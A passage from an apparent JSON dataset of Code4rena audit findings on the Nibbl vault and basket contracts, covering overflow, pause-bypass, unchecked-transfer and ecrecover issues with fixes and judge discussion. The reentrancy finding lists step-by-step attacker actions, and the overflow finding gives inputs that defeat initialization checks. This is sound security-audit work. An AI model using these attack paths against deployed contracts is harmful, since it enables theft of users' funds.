      "content": "\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n191:          assetAddress = _assetAddress;\n\n193:          curator = _curator;\n\n487:          curator = _newCurator;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L191>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n100:         pendingBasketImplementation = _newBasketImplementation;\n\n124:         pendingFeeTo = _newFeeAddress;\n\n159:         pendingVaultImplementation = _newVaultImplementation;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42683",
      "title": "[L-05] `_safeMint()` should be used rather than `_mint()` wherever possible",
      "impact": "LOW",
      "content": "\n`_mint()` is [discouraged](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L271) in favor of `_safeMint()` which ensures that the recipient is either an EOA or implements `IERC721Receiver`. Both [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L238-L250) and [solmate](https://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/tokens/ERC721.sol#L180) have versions of this function\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Basket.sol   #1\n\n24:           _mint(_curator, 0);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L24>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42682",
      "title": "[L-03] Return values of `transfer()`/`transferFrom()` not checked",
      "impact": "LOW",
      "content": "\nNot all `IERC20` implementations `revert()` when there's a failure in `transfer()`/`transferFrom()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol   #1\n\n87:           IERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this)));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L87>\n\n```solidity\nFile: contracts/Basket.sol   #2\n\n94:               IERC20(_tokens[i]).transfer(msg.sender, IERC20(_tokens[i]).balanceOf(address(this)));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L94>\n\n```solidity\nFile: contracts/NibblVault.sol   #3\n\n517:          IERC20(_asset).transfer(_to, IERC20(_asset).balanceOf(address(this)));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L517>\n\n```solidity\nFile: contracts/NibblVault.sol   #4\n\n526:              IERC20(_assets[i]).transfer(_to, IERC20(_assets[i]).balanceOf(address(this)));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L526>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42681",
      "title": "[L-02] `ecrecover()` not checked for signer address of zero",
      "impact": "LOW",
      "content": "\nThe `ecrecover()` function returns an address of zero when the signature does not match. This can cause problems if address zero is ever the owner of assets, and someone uses the permit function on address zero. If that happens, any invalid signature will pass the checks, and the assets will be stealable. In this case, the asset of concern is the vault's ERC20 token, and fortunately OpenZeppelin's implementation does a good job of making sure that address zero is never able to have a positive balance. If this contract ever changes to another ERC20 implementation that is laxer in its checks in favor of saving gas, this code may become a problem.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n563:         address signer = ecrecover(toTypedMessageHash(structHash), v, r, s);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L563>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42680",
      "title": "[M-11] Twav._getTwav() will return a wrong result when twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp = 0.",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese_\n\nThe \"if\" condition of Twav.\\_getTwav() is missing some edge cases.\n\nIn this case, this function will return 0 which is different from the correct value and it will affect the main functions like NibblVault.buy() and NibblVault.sell().\n\n### Proof of Concept\n\nI think this condition is to confirm at least 4 values were saved for twav calculation.\n\nBtw this timestamp would be zero even though there are more than 4 values properly as it's modularized by 2\\*\\*32.\n\nIn this case, the if condition will be false and this function will return 0.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nI see \"cumulativeValuation\" is increasing all the time and recommend replacing \"timestamp\" with \"cumulativeValuation\".\n\n    if (twavObservations[TWAV_BLOCK_NUMBERS - 1].cumulativeValuation != 0) {\n\n**[mundhrakeshav (Nibbl) confirmed and resolved](https://github.com/code-423n4/2022-06-nibbl-findings/issues/112#issuecomment-1172055034)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/112#issuecomment-1173189926):**\n > Interesting catch. This is related to [#178](https://github.com/code-423n4/2022-06-nibbl-findings/issues/178) but presents a distinct issue.\n\n\n\n***\n\n",
      "summary": "\nThe bug report submitted by user hansfriese highlights an issue with the \"if\" condition in the Twav.\\_getTwav() function. This condition is missing some edge cases, which causes the function to return 0 instead of the correct value. This affects important functions such as NibblVault.buy() and NibblVault.sell(). The user has provided proof of concept and used Solidity Visual Developer of VSCode for their analysis. They suggest replacing \"timestamp\" with \"cumulativeValuation\" as a mitigation step. Another user, mundhrakeshav (Nibbl), has confirmed and resolved the issue, while judge HardlyDifficult has commented on the related issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/112",
      "tags": [],
      "finders": []
    },
    {
      "id": "42679",
      "title": "[M-10] Reentrancy bug in Basket's withdraw multiple tokens function which gives attacker ability to transfer basket ownership and spend it but withdraw all the tokens out of basket",
      "impact": "MEDIUM",
      "content": "_Submitted by unforgiven_\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41-L47>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L68-L75>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L91-L97>\n\n### Impact\n\n`Basket` is used for keep multiple tokens in contract and mint one `NFT` token to represent their ownership. `Basket` only allows for owner of `NFT(id=0)` to withdraw tokens from `Basket` address. users can deposit multiple tokens in one `Basket` and then create a `NibbVault` based on that `Basket NFT`. but due to reentrancy vulnerability in `Basket` it's possible to call the multiple-token-withdraw functions (`withdrawMultipleERC721()`, `withdrawMultipleERC1155()`, `withdrawMultipleERC721()` and `withdrawMultipleERC20()`) and in the middle their external calls, spend `Basket NFT` (transfer ownership of `id=0` to other contract, for example `createVault()`) and receive some fund from other, then in the rest of the multiple-token-withdraw function withdraw all the basket tokens. `Basket` shouldn't allow transferring ownership of `id=0` in the middle of multiple token withdraws.\n\n### Proof of Concept\n\nThis is `withdrawMultipleERC721()` code:\n\n        function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {\n            require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");\n            for (uint256 i = 0; i < _tokens.length; i++) {\n                IERC721(_tokens[i]).safeTransferFrom(address(this), _to, _tokenId[i]);\n                emit WithdrawERC721(_tokens[i], _tokenId[i], _to);\n            }\n        }\n\nAs you can see, contract only checks the ownership of `id=0` in the beginning of the function to see that user allowed to perform this action or not. then it iterates through user specified addresses and call `safeTransferFrom()` function in those address by user specified values. the bug is that in the middle of the external calls attacker can spend `Basket NFT id=0` (give ownership of that basket to other contracts and receive fund from them, for example attacker can call `createVault` in `NibblVaultFactory` and create a vault and call other contracts to invest in that vault) then in the rest of the iterations in `withdrawMultipleERC721()` attacker can withdraw `Basket` tokens. so even so the ownership of the `Basket` has been transferred and attacker received funds for it, attacker withdraw `Basket` tokens too.\n\nThis is the steps attacker would perform:\n\n1.  Create a `Basket` with well known `NFT` token list. let's assume the `Basket` name is `Basket_M`\n2.  Give approve permission to `NibblVaultFactory` for `Basket_M id=0` token.\n3.  Call `Basket_M.withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to)` with list of all the tokens in basket to withdraw all of them, but the first address in the `_tokens` list is the address that attacker controls.\n4.  `Basket_M` would check that attacker is owner of the basket (owner of the `id = 0`) and in first iteration of the `for` it would call attacker controlled address which is a contract that attacker wrote its code.\n5.  Attacker contract would call `NibblVaultFactory.createVault()` with `Basket_M` address and `id=0` to create a vault which then transfer the ownership of `Basket_M id=0` to the vault address. let's assume it's `Vault_M`.\n6.  Attacker contract would buy some fraction of `Vault_M` by calling `buy()` function.\n7.  Let's assume there are other contracts(call it `Invest_Contract`) that would want to buy fraction of the well known `NFT`s in the basket and `Invest_Contract` invest some fund in vault having those `NFT` in vault's address or vault's basket just by calling `Invest_Contract`. attacker contract would call `Invest_Contract`  to invest in `Vault_M` and `Invest_Contract` would check that well known `NFT` is in `Basket_M id=0` which belongs to `Vault_M` to it would invest money on it by calling `initiateBuyout()`\n8.  Attacker contract then withdraw his money from `Vault_M` .\n9.  The rest of `Basket_M.withdrawMultipleERC721()` for iterations performs and all the `NFT` tokens of the `Basket_M` would be send to attacker and `Basket_M` would have nothing.\n\nSteps 5 to 8 can be other things, the point is in those steps attacker would spent `Basket_M` and receive some fund from other contract while those other contracts checks that they are owner of the `Basket_M` which has well known `NFT` tokens, but in fact attacker withdraw those well known `NFT` tokens from `Basket_M` after spending it in the rest of the `withdrawMultipleERC721()` iterations. (those above step 5-8 is just a sample case)\n\nSo `Basket` shouldn't allow ownership transfer in the middle of the `Basket_M.withdrawMultipleERC721()` and similar multiple-token-withdraw functions or it should check the ownership in every iteration.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nCheck ownership of `id=0` in every iteration or don't allow ownership transfer in the multiple-token-transfer functions.\n\n**[mundhrakeshav (Nibbl) disputed](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185)** \n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1166658269):**\n > Contract checks if you own it as owner of Basket has bought it, and as such is entitled to underlying tokens.\n\n**[KenzoAgada (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1166696834):**\n > The attack is contingent on a regular user, creating a smart contract, which allows anybody to call it, which checks that a parameter-supplied Nibbl vault contains a Nibbl basket which contains a specific NFT, and then proceeds to buyout/buy shares of that vault.\n> \n> Honestly it seems like the vector of attack is possible but quite far fetched.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1173071137):**\n > Creative thinking, this is what I'm here for!\n> \n> If I'm following the flow correctly.. you kick off a bulk withdraw from the basket, the first NFT in the list is a malicious contract which then creates a vault for that basket (so the contract needs to be the basket owner, which is okay). Now the vault is fully created for that basket which still has valuable NFTs in it but you're mid-tx. Your malicious contract pings other contracts which can be prompted to ape in via on-chain logic -- their logic confirms all looks well and buys. But then control returns to the original batch withdrawal and the basket is drained.\n> \n> > Honestly it seems like the vector of attack is possible but quite far fetched.\n> \n> I think I'd agree. To put it in terms of risk, this is not High: \"valid attack path that does not have hand-wavy hypotheticals\" -- this sounds a bit hand-wavy. Namely because it assumes `Invest_Contract` allows any address to trigger a purchase using other users funds which seems risky. And the victim here is `Invest_Contract`, not regular users of the protocol. Lowering to Medium. Great stuff though.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1173125303):**\n > The finding in essence is claiming that you can setup an empty `Basket` and sell it to external contracts, and those contracts would lose funds.\n> \n> If that were the case the vulnerability would be in the \"sniping / buying\" contracts and not in the Basket nor the Vault.\n> \n> The only thing the warden has shown is that they can create a Basket with a malicious token and through that they can call the Factory to create a Vault which after the tx will be empty.\n> \n> This is logically equivalent to selling an empty vault, or selling a vault of `BryptoPunks` (typo on purpose, it's a scam token).\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1173126326):**\n > @Alex the Entreprenerd -\n> I agree in terms of normal usage. The key here is a 3rd party contract uses on-chain logic in order to authorize a purchase. If that were the case, while in the middle of the attack as described all checks that contract may perform would confirm assets were included and terms look good -- it would not be able to determine that the basket was in the middle of a batch withdraw request. Let me know if I'm overlooking something.\n> \n> The basket itself does not need to hold a malicious token -- the withdraw request takes an array of addresses, so the malicious contract only need to appear there.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1173140273):**\n > > If that were the case, while in the middle of the attack as described all checks that contract may perform would confirm assets were included and terms look good -- it would not be able to determine that the basket was in the middle of a batch withdraw request. Let me know if I'm overlooking something.\n> \n> The 3rd party contract would need to check that the Basket is properly set via `ownerOf(Basket) == Vault` (where Vault is an address contained in the list of `nibbledVaults` from factory).\n\n> That would allow to determine if the contract is properly setup.\n> \n> > The basket itself does not need to hold a malicious token,\n>  \n> That is correct as you can setup any contract to accept the `safeTransferFrom` call.\n> \n> My statement is that an automated 3rd party contract can get rekt, but that's not the contract under audit.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/185#issuecomment-1173175820):**\n > Agree that it's the 3rd party contract that suffers a loss.\n> \n> An `ownerOf(Basket) == Vault && ownerOf(NFT) == Basket` check is insufficient here because if it's in the middle of this scenario then the owner checks will appear legit but by the end of the tx they won't be. That's the part that I'm still hung up on. Part of the Medium definition is \"the function of the protocol or its availability could be impacted\" -- although not an explicit goal, is it not implicit that protocols can be built upon with other contracts. The concern here seems to limit that ability, one could not build a contract that decided to participate based on on-chain state alone w/ or w/o an allow list of NFTs -- it would require a trusted actor to allow list specific vaults or to perform the action itself.\n> \n> This is certainly grey though. Very hypothetical, e.g. it's not clear that a 3rd party contract would ever be interested in a capability like this. This is an interesting discussion! I'll sleep on it, but please chime in if you have more to add - I appreciate the feedback.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `Basket` contract that can allow an attacker to transfer ownership of the `NFT` token representing the ownership of the basket in the middle of a multiple-token-withdrawal function. This can result in the attacker receiving funds from other contracts and then withdrawing all the tokens from the basket. The report suggests checking the ownership of the `NFT` token in every iteration or not allowing ownership transfer during multiple-token-withdrawal functions. The report also includes a proof of concept and recommended mitigation steps. The severity of this vulnerability has been disputed and decreased to Medium, as it is a hypothetical attack and may not have a significant impact on the protocol. The judges and wardens have also discussed the possibility of this attack and its implications for the protocol. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/185",
      "tags": [],
      "finders": []
    },
    {
      "id": "42678",
      "title": "[M-08] [PNM-004] Calculation of `_secondaryReserveRatio` can be overflowed",
      "impact": "MEDIUM",
      "content": "_Submitted by PwnedNoMore, also found by ych18_\n\n`uint32 _secondaryReserveRatio = uint32((msg.value * SCALE * 1e18) / (_initialTokenSupply * _initialTokenPrice));`\n\n`_secondaryReserveRatio` can be overflowed by setting a relatively small `_initialTokenSupply` and `_initialTokenPrice`. The result will be truncated by `uint32`, causing an overflow.\n\nThis overflow can bypass all the checks in function `initialize`. Any following functionality will be impacted since the `_secondaryReserveRatio` is incorrect.\n\n### Proof of Concept / Attack Scenario\n\n*   The user provide `_initialTokenSupply` and `_initialTokenPrice`, which meets `SCALE * 1e18 == _initialTokenSupply * _initialTokenPrice`\n*   The `msg.value` is set as `2 ** 32 + X`, where `MIN_SECONDARY_RESERVE_RATIO <= X <= primaryReserveRatio`. Note that `msg.value` is in Wei, so the deposited fund is not huge.\n\n### Suggested Fix\n\nAdd overflow checks.\n\n**[mundhrakeshav (Nibbl) acknowledged](https://github.com/code-423n4/2022-06-nibbl-findings/issues/273)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/273#issuecomment-1173223715):**\n > OpenZeppelin has safe cast helpers that could be leveraged here.\n> \n> It is concerning that due to the truncation here, the configuration would not work how the user expects given the input parameters. And at this point the NFT has been escrowed into the vault. Because of this it seems Medium risk is a fair assessment. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue found in a code submitted by PwnedNoMore and also discovered by ych18. The code contains a variable called `_secondaryReserveRatio` which can be overflowed by setting small values for `_initialTokenSupply` and `_initialTokenPrice`. This overflow can bypass certain checks and cause incorrect functionality. A suggested fix is to add overflow checks and use OpenZeppelin's safe cast helpers. The judges have acknowledged the issue and commented that it poses a medium risk as it could affect the intended functionality of the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/273",
      "tags": [],
      "finders": []
    },
    {
      "id": "42677",
      "title": "[M-07]  `_updateTwav()` and `_getTwav()` will revert when cumulativePrice overflows",
      "impact": "MEDIUM",
      "content": "_Submitted by peritoflores, also found by WatchPug_\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L28>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L40>\n\n### Impact\n\nContract will break when `cumulativeValuation` overflows.\n\n### Proof of Concept\n\nCumulative prices are designed to work with overflows/underflows because in the end  the difference is important.\n\nIn `_updateTwav()`  when \\_`prevCumulativeValuation + (_valuation *_timeElapsed)`  overflows the contract will not work anymore.\n\n    twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative @audit overflow breaks the contract\n\nSame  problem in `_getTwav()`\n\n      _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);@audit same overflow breaks the contract\n\n    }\n\n### Similar issues\n\n<https://github.com/code-423n4/2022-04-phuture-findings/issues/62>\n\n### Recommended Mitigation\n\nAdd unchecked keyword in every line you add / subtract cumulative prices.\n\n**[mundhrakeshav (Nibbl) acknowledged](https://github.com/code-423n4/2022-06-nibbl-findings/issues/246)** \n\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/246#issuecomment-1172978466):**\n > Without a better POC of the issue occurring it's hard to justify this is High risk. e.g. maybe it could be forced by spamming `updateTWAV`, but it's not clear if that would require extremely large values or an unrealistic number of transactions.\n> \n> Related to https://github.com/code-423n4/2022-06-nibbl-findings/issues/178, that one includes unchecking the price in the recommendation but the rest of the description focuses on timestamp overflows while this one looks at price overflows.\n\n\n\n***\n\n",
      "summary": "\nThis bug report highlights an issue with the `cumulativeValuation` function in the Nibbl contract. The report states that when this function overflows, the contract will stop working. This issue was discovered by two individuals and has been acknowledged by the project's developer. The report also mentions a similar issue in a previous contract. The recommended solution is to add the `unchecked` keyword in every line where cumulative prices are added or subtracted. The severity of this issue has been decreased to medium by the judge, as there is no clear proof of the issue occurring. This bug is related to another issue in the contract, but focuses on price overflows rather than timestamp overflows.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/246",
      "tags": [],
      "finders": []
    },
    {
      "id": "42676",
      "title": "[M-03] User Could Change The State Of The System While In `Pause` Mode",
      "impact": "MEDIUM",
      "content": "_Submitted by xiaoming90_\n\nCalling `NibblVault.updateTWAP` function will change the state of the system. It will cause the TWAP to be updated and buyout to be rejected in certain condition.\n\nWhen the system is in `Pause` mode, the system state should be frozen. However, it was possible for someone to call the `NibblVault.updateTWAP` function during the `Pause` mode, thus making changes to the system state.\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L443>\n\n```solidity\n/// @notice Updates the TWAV when in buyout\n/// @dev TWAV can be updated only in buyout state\nfunction updateTWAV() external override {\n    require(status == Status.buyout, \"NibblVault: Status!=Buyout\");\n    uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n    if (_blockTimestamp != lastBlockTimeStamp) {\n        _updateTWAV(getCurrentValuation(), _blockTimestamp);   \n        _rejectBuyout(); //For the case when TWAV goes up when updated externally\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nEnsure that the `NibblVault.updateVault` function cannot be called when the system is in `Pause` mode.\n\nAdd the `whenNotPaused` modifier to the function.\n\n```solidity\n/// @notice Updates the TWAV when in buyout\n/// @dev TWAV can be updated only in buyout state\nfunction updateTWAV() external override whenNotPaused {\n    require(status == Status.buyout, \"NibblVault: Status!=Buyout\");\n    uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n    if (_blockTimestamp != lastBlockTimeStamp) {\n        _updateTWAV(getCurrentValuation(), _blockTimestamp);   \n        _rejectBuyout(); //For the case when TWAV goes up when updated externally\n    }\n}\n```\n\n**[mundhrakeshav (Nibbl) marked as duplicate and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/200#issuecomment-1166505154):**\n > Duplicate of [#56](https://github.com/code-423n4/2022-06-nibbl-findings/issues/56)\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/200#issuecomment-1173872782):**\n > > #56\n> \n> It's not clear to me how this is a dupe of #56 \n> \n> This is a valid concern and potentially a change worth making.\n> \n> >  It will cause the TWAP to be updated and buyout to be rejected\n> \n> This makes me think Medium risk is correct here. In this scenario a buyout could be rejected without allowing other users to challenge that -- seemingly breaking one of the benefits behind using Twap for this logic.\n\n\n\n***\n\n",
      "summary": "\nThe bug report states that calling the `NibblVault.updateTWAP` function can cause changes to the system state, even when the system is in `Pause` mode. This is a concern because the system state is supposed to be frozen during `Pause` mode. The recommended solution is to add the `whenNotPaused` modifier to the function to prevent it from being called during `Pause` mode. This bug has been marked as a duplicate of a previous issue and is considered a medium risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/200",
      "tags": [],
      "finders": []
    },
    {
      "id": "42675",
      "title": "[M-02] `Twav.sol#_getTwav()` will revert when timestamp > 4294967296",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by hansfriese and IllIllI_\n\n```solidity\nfunction _getTwav() internal view returns(uint256 _twav){\n    if (twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp != 0) {\n        uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS;\n        TwavObservation memory _twavObservationCurrent = twavObservations[(_index)];\n        TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n        _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);\n    }\n}\n```\n\nSince `_blockTimestamp` is `uint32`, subtraction underflow is desired at `_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp`.\n\nSee: <https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleOracleSimple.sol#L43>\n\n```solidity\nfunction update() external {\n    (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) =\n        UniswapV2OracleLibrary.currentCumulativePrices(address(pair));\n    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n```\n\nBecause the solidity version used by the current implementation is `0.8.10`, and there are some breaking changes in Solidity v0.8.0:\n\n> Arithmetic operations revert on underflow and overflow.\n\nRef: <https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html#silent-changes-of-the-semantics>\n\nThe timestamp subtraction may revert due to underflow.\n\n### Impact\n\nSince `_getTwav()` is used in `NibblVault.sol#_rejectBuyout()`, if it reverts and there is a `buyout`, an essential feature of the `NibblVault` contract will be unavailable, causing users' funds to be frozen in the contract.\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction _updateTWAV(uint256 _valuation, uint32 _blockTimestamp) internal {\n    uint32 _timeElapsed; \n    unchecked {\n        _timeElapsed = _blockTimestamp - lastBlockTimeStamp;\n    }\n\n    uint256 _prevCumulativeValuation = twavObservations[((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS].cumulativeValuation;\n    unchecked {\n        twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative\n    }\n    \n    twavObservationsIndex = (twavObservationsIndex + 1) % TWAV_BLOCK_NUMBERS;\n    lastBlockTimeStamp = _blockTimestamp;\n}\n```\n\n```solidity\nfunction _getTwav() internal view returns(uint256 _twav){\n    if (twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp != 0) {\n        uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS;\n        TwavObservation memory _twavObservationCurrent = twavObservations[(_index)];\n        TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n        unchecked {\n            _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);\n        }\n    }\n}\n```\n**[mundhrakeshav (Nibbl) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-06-nibbl-findings/issues/178)**\n\n**[KenzoAgada (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/178#issuecomment-1166164271):**\n > If I'm not mistaken, timestamp 4294967296 is 2106, I wouldn't call the contract breaking in 84 years a high severity issue. Plus the contract is truncating the timestamp on purpose. Seems to me more like a design choice and less of a bug.\n\n**[mingwatch (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/178#issuecomment-1166798846):**\n > > If I'm not mistaken, timestamp 4294967296 is 2106, I wouldn't call the contract breaking in 84 years a high severity issue. Plus the contract is truncating the timestamp on purpose. Seems to me more like a design choice and less of a bug.\n> \n> https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Twav/Twav.sol#L23-L25\n> \n> ```solidity\n> function _updateTWAV(uint256 _valuation, uint32 _blockTimestamp) internal {\n>         uint32 _timeElapsed; \n>         unchecked {\n>             _timeElapsed = _blockTimestamp - lastBlockTimeStamp;\n>         }\n>  ```\n>  \n> According to the above code, is obviously not a design choice.\n>  \n\n**[KenzoAgada (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/178#issuecomment-1166807275):**\n > > According to the above code, is obviously not a design choice.\n> \n> Ah, I think I understand what you mean, it is not handled consistently.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/178#issuecomment-1171706893):**\n > > it is not handled consistently\n> \n> Thanks for the clarifications!\n> \n> `_getTwav` would overflow once timestamps overflow uint32, but only when the current observation has overflowed while the previous observation did not.\n> \n> The window for this vulnerability is very small, just at the time timestamp starts to overflow in 2106 - vaults active before or after that time should work as expected. \n> \n> This appears to be a Medium risk finding.  There's potentially a case to be made for high here but it's hard to make that call without a more complete POC included. The vault is an upgradeable contract so they have 84 years to sort this out -- but it does seem like an issue that should be fixed.\n\n\n\n***\n\n",
